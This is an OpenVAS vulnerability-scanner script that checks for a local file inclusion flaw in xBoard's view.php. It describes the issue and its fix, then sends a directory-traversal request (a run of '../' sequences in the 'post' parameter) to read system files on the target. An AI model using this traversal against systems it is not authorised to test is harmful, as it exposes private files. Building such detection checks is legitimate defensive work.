##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xboard_post_lfi_vuln.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# xBoard Local File Inclusion Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803790");
  script_version("$Revision: 7577 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2013-12-27 11:30:04 +0530 (Fri, 27 Dec 2013)");
  script_name("xBoard Local File Inclusion Vulnerability");

  script_tag(name : "summary" , value : "The host is running xBoard and is prone to Local file inclusion vulnerability.");
  script_tag(name : "vuldetect" , value : "Send the crafted HTTP GET request and check is it possible to read
  the system file.");
  script_tag(name : "solution" , value : "Ugrade to xBoard 6.5 or later,
  For updates refer to http://sourceforge.net/projects/xboard ");
  script_tag(name : "insight" , value : "The flaw is due to an improper validation of user-supplied input to the 'post'
  parameter in 'view.php', which allows attackers to read arbitrary files via a
  ../(dot dot) sequences.");
  script_tag(name : "affected" , value : "xBoard versions 5.0, 5.5, 6.0 ");
  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to read arbitrary files
  on the target system.

  Impact Level: Application");

  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013120166");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/124589/xboard-lfi.txt");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
xbPort = "";
dir = "";

## Get HTTP Port
xbPort = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:xbPort)){
  exit(0);
}

foreach dir (make_list_unique("/", "/xboard", "/xBoard", cgi_dirs(port:xbPort)))
{

  if(dir == "/") dir = "";
  url = dir + "/main.php";

  ## Confirm the application
  if(http_vuln_check(port:xbPort, url:url, pattern:">xBoard<",
                 check_header:TRUE))
  {
    ## traversal_files() function Returns Dictionary (i.e key value pair)
    ## Get Content to be checked and file to be check
    files = traversal_files();

    foreach file (keys(files))
    {
      ## Construct directory traversal attack
      url = dir + "/view.php?post=" + crap(data:"../",length:3*15) +
            files[file];

      ## Confirm exploit worked properly or not
      if(http_vuln_check(port:xbPort, url:url,pattern:file))
      {
        security_message(port:xbPort);
        exit(0);
      }
    }
  }
}

exit(99);